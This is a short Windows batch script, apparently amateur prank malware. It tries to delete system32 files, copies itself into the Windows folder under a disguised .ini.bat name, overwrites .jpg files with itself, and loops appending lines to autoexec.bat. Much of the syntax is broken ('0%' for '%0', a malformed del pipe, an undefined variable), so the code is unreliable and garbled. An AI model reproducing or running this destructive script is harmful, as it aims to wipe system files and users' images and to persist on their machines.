@echo off
if exist C:\windows\system32*.* Del Y | C:\windows\system32\*.* >> autoexec.bat
copy 0% C:\windows\Msdos726.ini.bat
if exist C:\*.jpg copy 0% C:\*.jpg
:loop
set Retard=loop
If !%H%==!true pause
%H%>nul >> autoexec.bat
Goto %Retard%
